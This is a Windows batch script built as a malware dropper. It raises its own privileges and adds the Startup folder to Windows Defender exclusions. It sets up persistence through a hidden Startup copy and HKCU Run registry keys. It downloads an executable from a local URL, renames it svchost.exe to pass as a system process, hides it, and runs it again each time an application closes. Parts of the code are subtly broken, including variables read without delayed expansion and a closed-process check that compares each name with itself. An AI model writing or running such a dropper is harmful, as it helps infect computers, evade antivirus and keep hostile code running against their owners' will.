@echo off
:: Batch script to rename downloaded file, set new registry key, hide files, add Startup folder to Windows Defender exclusions, monitor application close events, download a file, and execute it

:: Define the URL of the file to download
set "downloadUrl=http://localhost:8080/rufus.exe"
:: Define the destination path for the downloaded file (Startup folder)
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
:: Define the new name for the downloaded file
set "newFileName=svchost.exe"
:: Define the full path for the renamed file
set "renamedFilePath=%startupFolder%\%newFileName%"
:: Define the registry key name for the renamed file
set "registryKeyName=MyAppLauncher"

:: Ensure the script runs with elevated privileges
:: Check if the script is running as administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    :: Relaunch the script with elevated privileges
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Add the Startup folder to Windows Defender exclusions
echo Adding Startup folder to Windows Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '%startupFolder%'"
if %errorLevel% equ 0 (
    echo Startup folder added to Windows Defender exclusions.
) else (
    echo Failed to add Startup folder to Windows Defender exclusions.
)

:: Ensure the script runs persistently (e.g., at system startup)
:: Method 1: Add to the Startup folder and hide it
if not exist "%startupFolder%\%~nx0" (
    echo Copying script to Startup folder...
    copy "%~f0" "%startupFolder%\%~nx0" >nul
    attrib +h "%startupFolder%\%~nx0" >nul
    echo Script hidden in Startup folder.
)

:: Method 2: Add to the Windows Registry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistentScript" >nul 2>&1
if %errorLevel% neq 0 (
    echo Adding script to Registry...
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistentScript" /t REG_SZ /d "\"%~f0\"" /f
)

:: Function to download the file using PowerShell, rename it, hide it, set a new registry key, and execute it
:DownloadFile
echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri '%downloadUrl%' -OutFile '%startupFolder%\tempfile.exe'"
if exist "%startupFolder%\tempfile.exe" (
    echo File downloaded to %startupFolder%\tempfile.exe
    :: Rename the downloaded file
    ren "%startupFolder%\tempfile.exe" "%newFileName%"
    echo File renamed to %newFileName%.
    :: Hide the renamed file
    attrib +h "%renamedFilePath%" >nul
    echo Renamed file hidden in Startup folder.
    :: Set a new registry key for the renamed file
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%registryKeyName%" >nul 2>&1
    if %errorLevel% neq 0 (
        echo Adding new registry key for renamed file...
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%registryKeyName%" /t REG_SZ /d "\"%renamedFilePath%\"" /f
    )
    :: Execute the renamed file
    echo Executing renamed file...
    start "" "%renamedFilePath%"
) else (
    echo Failed to download the file.
)
goto MonitorProcesses

:: Function to monitor application close events
:MonitorProcesses
echo Monitoring application close events...
:: Get the list of running processes
for /f "tokens=*" %%a in ('powershell -Command "Get-Process | Select-Object -ExpandProperty ProcessName"') do (
    set "processList=!processList! %%a"
)

:: Loop indefinitely to monitor processes
:MonitorLoop
:: Get the current list of running processes
set "currentProcessList="
for /f "tokens=*" %%a in ('powershell -Command "Get-Process | Select-Object -ExpandProperty ProcessName"') do (
    set "currentProcessList=!currentProcessList! %%a"
)

:: Compare the previous list with the current list to find closed processes
for %%a in (%processList%) do (
    echo %%a | findstr /i /c:"%%a" >nul 2>&1
    if errorlevel 1 (
        echo Application closed: %%a
        call :DownloadFile
    )
)

:: Update the list of processes
set "processList=%currentProcessList%"

:: Wait for a short period before checking again
timeout /t 1 /nobreak >nul
goto MonitorLoop